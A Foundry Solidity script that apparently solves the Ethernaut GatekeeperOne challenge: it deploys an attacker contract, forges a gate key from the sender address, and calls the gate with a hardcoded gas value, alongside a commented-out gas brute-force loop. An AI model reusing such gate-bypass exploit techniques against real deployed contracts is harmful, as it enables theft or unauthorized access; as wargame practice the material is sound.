// SPDX-License-Identifier: MIT
pragma solidity ^0.8.13;

import {Script, console2} from "forge-std/Script.sol";
import {GatekeeperOne} from "src/gatekeeperone/GatekeeperOne.sol";
import {GatemasterOne} from "src/gatekeeperone/GateMaster.sol";

contract VaultScript is Script {
    GatekeeperOne internal gatekeeperone;
    GatemasterOne internal gateMaster;

    function _getRevertMsg(
        bytes memory _returnData
    ) internal pure returns (string memory) {
        // If the revert reason is empty, return a default message
        if (_returnData.length < 68) return "Transaction reverted silently";

        assembly {
            // Slice the sighash
            _returnData := add(_returnData, 0x04)
        }
        return abi.decode(_returnData, (string)); // All that remains is the revert string
    }

    function createGateKey() public view returns (bytes8) {
        uint16 lower16BitsOfSender = uint16(uint160(msg.sender));
        uint32 lower16BitsTo32Bits = uint32(lower16BitsOfSender);

        // The upper 32 bits should be different from the lower 32 bits. We can use any value.
        uint32 upper32Bits = 0xDEADBEEF; // Example value

        return
            bytes8(uint64(lower16BitsTo32Bits) | (uint64(upper32Bits) << 32));
    }

    function setUp() public virtual {
        gatekeeperone = GatekeeperOne(
            0x2cda5B1Bcf363503078C2695d2737F50631925aE
        );
        gateMaster = new GatemasterOne(address(gatekeeperone));
    }

    function run() public virtual {
        vm.startBroadcast();
        setUp();
        gateMaster.enter(createGateKey(), 24829);
        /**
            Script to brute force the required gas amount to pass the gatekeeper
         */
        // uint256 initialGas = 24829; // Starting gas value
        // uint256 lastGasUsed;
        // //Loop until we find the right gas amount
        // for (uint256 i = 0; i < 8191; i++) {
        //     // Calculate gas to use
        //     uint256 gasToUse = initialGas + i;
        //     //uint256 gasToUse = initialGas;

        //     // Attempt to call 'enter' with specific gas amount
        //     (bool success, bytes memory revertData) = address(gateMaster).call(
        //         abi.encodeWithSignature(
        //             "enter(bytes8,uint256)",
        //             createGateKey(),
        //             24829
        //         )
        //     );

        //     if (success) {
        //         lastGasUsed = gasToUse;
        //         console2.log(gasToUse);
        //         break;
        //     }
        // }
        // ---> result = 24829

        vm.stopBroadcast();
    }
}
